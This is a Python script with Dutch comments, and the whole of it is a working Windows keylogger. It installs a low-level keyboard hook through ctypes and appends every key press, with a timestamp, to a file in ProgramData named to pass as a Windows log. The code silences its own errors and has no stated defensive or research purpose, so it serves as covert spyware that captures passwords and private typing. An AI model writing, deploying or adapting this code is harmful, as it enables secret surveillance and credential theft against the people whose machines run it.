import ctypes
from ctypes import wintypes
import time
import datetime
import sys

LOG_FILE = "C:\\ProgramData\\windows_log.txt"

# Windows constants
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104

# Variabelen voor hook
hook_id = None
log_file = None

def log_keystroke(key_code):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            timestamp = datetime.datetime.now().strftime("%H:%M:%S")
            f.write(f"[{timestamp}] {key_code}\n")
    except:
        pass

# De hook callback functie
def low_level_keyboard_handler(nCode, wParam, lParam):
    if nCode >= 0 and (wParam == WM_KEYDOWN or wParam == WM_SYSKEYDOWN):
        # lParam is een pointer naar een KBDLLHOOKSTRUCT
        # We lezen de virtual key code uit de structuur
        vk_code = ctypes.cast(lParam, ctypes.POINTER(wintypes.DWORD)).contents.value
        log_keystroke(vk_code)
    return ctypes.windll.user32.CallNextHookExW(hook_id, nCode, wParam, lParam)

# Definieer functietypes
HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
hook_proc = HOOKPROC(low_level_keyboard_handler)

# Installeer de hook
hook_id = ctypes.windll.user32.SetWindowsHookExW(WH_KEYBOARD_LL, hook_proc, None, 0)

if hook_id == 0:
    with open(LOG_FILE, "a") as f:
        f.write("Fout bij installeren hook\n")
else:
    # Message loop (nodig om de hook actief te houden)
    msg = wintypes.MSG()
    while ctypes.windll.user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
        ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
        ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))